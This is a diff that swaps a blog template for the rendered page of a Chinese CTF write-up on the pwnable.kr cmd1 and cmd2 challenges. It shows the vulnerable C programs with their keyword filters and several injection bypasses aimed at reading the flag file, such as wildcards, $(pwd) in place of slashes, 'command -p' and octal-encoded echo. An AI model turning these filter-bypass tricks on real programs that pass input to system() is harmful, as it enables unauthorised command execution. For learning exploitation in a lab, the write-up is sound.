@@ -1,32 +1,226 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>pwnable.kr cmd1 cmd2 | Fish</title><meta name="keywords" content="wp,CTF,pwn"><meta name="author" content="Fish"><meta name="copyright" content="Fish"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="cmd1linuxPATH入门教学linux命令通配符putenv函数讲解 这道题考察的是对于linux中shell的操作，还有PATH环境知识的理解。我参考了上面三篇文章，都写得很不错👍。这里我写两种解决方法  method 1首先ssh登录，查看源码 12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;str">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr cmd1 cmd2">
+<meta property="og:url" content="http://example.com/46930/index.html">
+<meta property="og:site_name" content="Fish">
+<meta property="og:description" content="cmd1linuxPATH入门教学linux命令通配符putenv函数讲解 这道题考察的是对于linux中shell的操作，还有PATH环境知识的理解。我参考了上面三篇文章，都写得很不错👍。这里我写两种解决方法  method 1首先ssh登录，查看源码 12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;str">
+<meta property="og:locale">
+<meta property="og:image" content="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202003258116.png">
+<meta property="article:published_time" content="2021-07-14T04:44:16.830Z">
+<meta property="article:modified_time" content="2021-08-08T09:34:24.640Z">
+<meta property="article:author" content="Fish">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202003258116.png"><link rel="shortcut icon" href="/img/bulefish32.png"><link rel="canonical" href="http://example.com/46930/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-08-08 17:34:24'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-    if theme.reward.enable
-      !=partial('includes/post/reward', {}, {cache: true})
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><link rel="stylesheet" href="/css/footer.css"><link rel="stylesheet" href="/css/roll.css"><link rel="stylesheet" href="/css/fold2.css"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Fish" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/%E7%8D%AD%E7%8D%AD.JPG" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">17</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202003258116.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Fish</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pwnable.kr cmd1 cmd2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">Created</span><time datetime="2021-07-14T04:44:16.830Z" title="undefined 2021-07-14 12:44:16">2021-07-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/pwn/">pwn</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/pwn/pwnable-kr/">pwnable.kr</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><span id="more"></span>
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .ads-wrap!=theme.ad.post
+<h3 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h3><p><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/5876.html">linuxPATH入门教学</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_16334327/article/details/96591949">linux命令通配符</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/shisiye15/article/details/7846557">putenv函数讲解</a></p>
+<p>这道题考察的是对于linux中shell的操作，还有PATH环境知识的理解。我参考了上面三篇文章，都写得很不错👍。这里我写两种解决方法</p>
+<p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210201203616211.png"></p>
+<h4 id="method-1"><a href="#method-1" class="headerlink" title="method 1"></a>method 1</h4><p>首先ssh登录，查看源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;sh&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;tmp&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">        putenv(<span class="string">&quot;PATH=/thankyouverymuch&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,getenv(<span class="string">&quot;PATH&quot;</span>));</span><br><span class="line">        system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        system( argv[<span class="number">1</span>] );</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    if theme.post_pagination
-      include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
+<p>程序将PATH环境设置成了一个不存在的路径导致不能直接使用命令，而且filter函数过滤掉了我们输入的一些字符。</p>
+<p>这里我们可以先来测试一下PATH如果被改变会怎么样，下面贴测试代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>**argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    	<span class="comment">//打印改变前的PATH，并且使用命令</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;before PATH: %s\n&quot;</span>,getenv(<span class="string">&quot;PATH&quot;</span>));</span><br><span class="line">        system(argv[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    	<span class="comment">//改变PATH，将其设置成一个不存在的路径</span></span><br><span class="line">        putenv(<span class="string">&quot;PATH=/aaa&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    	<span class="comment">//再次打印路径</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;after PATH: %s\n&quot;</span>, getenv(<span class="string">&quot;PATH&quot;</span>));</span><br><span class="line">        system(argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache: true})
-      
+<p>编译后运行，这里我们测试的命令是 <strong>ls</strong> ，可以发现ls命令已经失效了，由于PATH的路径被临时改变，需要使用ls命令的绝对路径 <strong>/bin/ls</strong></p>
+<p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210201204940643.png"></p>
+<p>再次测试，使用命令的绝对路径 <strong>/bin/ls</strong>，可以发现又可以正常运行了</p>
+<p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210201205043930.png"></p>
+<p>所以这道题我们需要输入<strong>cat</strong>命令的绝对路径 <strong>/bin/cat</strong>，但是问题又来了，flag这个词被过滤掉了，这就需要使用到统配符了，我们可以使用 <strong>“/bin/cat f*“</strong> 或者 <strong>“/bin/cat fla?”</strong> 等命令来实现查看flag</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./cmd1 &#x27;/bin/cat fla?&#x27;</span><br><span class="line">./cmd1 &#x27;/bin/cat f*&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210201205526147.png"></p>
+<p><em>mommy now I get what PATH environment is for :)</em></p>
+<h4 id="method-2"><a href="#method-2" class="headerlink" title="method 2"></a>method 2</h4><p>第二种方法是我们采用shell编程方式，先创建一个文件，在利用程序打开我们的文件，在文件中，我们可以使用任意字符而不受限制</p>
+<ul>
+<li><p>首先现在服务器的/tmp/目录下创建一个我们自己使用的目录，然后在目录中创建我们的文件，一会儿需要用程序来调用</p>
+<p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210201210815614.png"></p>
+</li>
+<li><p>在创建bash文件，文件名字里面千万不能带有过滤字符（我踩了这个坑😥），然后写入命令</p>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210201212309793.png"></p>
+<ul>
+<li> 让程序调用文件，一样可以达到效果</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210201212435273.png"></p>
+<h3 id="cmd2"><a href="#cmd2" class="headerlink" title="cmd2"></a>cmd2</h3><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210201212556897.png"></p>
+<p>cmd2的考点与cmd1大同小异，只是这一次源码中过滤了更多的字符，需要更高的技巧才能绕过字符过滤检测拿到flag，下面贴源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;=&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;PATH&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;export&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;/&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;`&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span>** p;</span><br><span class="line">        <span class="keyword">for</span>(p=environ; *p; p++) <span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">        delete_env();</span><br><span class="line">        putenv(<span class="string">&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">        system( argv[<span class="number">1</span>] );</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这次程序直接过滤了’/‘,’.’之类的符号，连路径都不让使用💔 下面我提供几种种方法（网上看到总结的，学习一手）</p>
+<h4 id="利用pwd"><a href="#利用pwd" class="headerlink" title="利用pwd"></a>利用pwd</h4><p>利用$，我们可以进入到根目录，用$(pwd)来代替’/‘</p>
+<p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210202002742365.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br><span class="line">/home/cmd2/cmd2 &#x27;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*&#x27;</span><br><span class="line">/home/cmd2/cmd2 &quot;\$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)f*&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210202001835043.png"></p>
+<p>上面两种写法都可以，这是linux中双引号和单引号的区别，下面这篇文章可以了解他们之间的区别</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014636245/article/details/82919144">Linux中单引号双引号的区别与用法</a></p>
+<h4 id="command-p"><a href="#command-p" class="headerlink" title="command -p"></a>command -p</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;command -p&#x27; //这条命令会强制将环境变为默认值，就不用使用绝对路径</span><br><span class="line">./cmd2 &#x27;command -p cat f*&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="echo解析8进制与16进制"><a href="#echo解析8进制与16进制" class="headerlink" title="echo解析8进制与16进制"></a>echo解析8进制与16进制</h4><p>在网上看别人wp学的其实我觉得原理和第一个差不太多，这个是利用echo可以解析16进制和8进制表示的字符串（但是不能用参数 -e），具体情况要看系统版本。（我在网上看到他们在远程服务器上echo命令可以解释8进制，但我试了试就不行，还是记录下这个方法）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 /bin/cat flag 转化为8进制</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">cmd = <span class="string">&quot;/bin/cat flag&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\\&quot;</span>+<span class="string">&quot;\\&quot;</span>.join([<span class="built_in">oct</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ordlist(cmd)]))</span><br><span class="line"><span class="comment"># \057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cmd2 &#x27;$(echo &quot;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>我的本地虚拟机就不可以直接用echo命令转，需要参数-e</p>
+<p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210202000852202.png"></p>
+<h4 id="set-s"><a href="#set-s" class="headerlink" title="set -s"></a>set -s</h4><p>具体的原理还没有在网上找到，等后面补充</p>
+<p><a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2017/11/bash-set.html">Bash 脚本 set 命令教程</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./cmd2 &#x27;set -s&#x27;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">/bin/cat flag</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
+<li><p>shell编程点都不会，其实上学期学了的，只是上网课一点都没有认真听。。想在想起来有点傻，后面需要补习下shell的知识</p>
+</li>
+<li><p>linux的东西太灵活了。。其实上面的两道题还有几种其他的方法，但是我精力和时间有限，只收集了几种我感觉还可以的方法</p>
+</li>
+<li><p>我太菜了。。🐹</p>
+</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Fish</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/46930/">http://example.com/46930/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post_share"><div class="social-share" data-image="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202003258116.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/32386/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">pwnable.kr uaf</div></div></a></div><div class="next-post pull-right"><a href="/19484/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">pwn heap[malloc_chunk结构体]</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/%E7%8D%AD%E7%8D%AD.JPG" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Fish</div><div class="author-info__description">binary</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">17</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/fish-snow"><i class="fab fa-github"></i><span>GitHub</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#cmd1"><span class="toc-number">1.</span> <span class="toc-text">cmd1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#method-1"><span class="toc-number">1.1.</span> <span class="toc-text">method 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#method-2"><span class="toc-number">1.2.</span> <span class="toc-text">method 2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cmd2"><span class="toc-number">2.</span> <span class="toc-text">cmd2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8pwd"><span class="toc-number">2.1.</span> <span class="toc-text">利用pwd</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#command-p"><span class="toc-number">2.2.</span> <span class="toc-text">command -p</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#echo%E8%A7%A3%E6%9E%908%E8%BF%9B%E5%88%B6%E4%B8%8E16%E8%BF%9B%E5%88%B6"><span class="toc-number">2.3.</span> <span class="toc-text">echo解析8进制与16进制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#set-s"><span class="toc-number">2.4.</span> <span class="toc-text">set -s</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Fish</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog 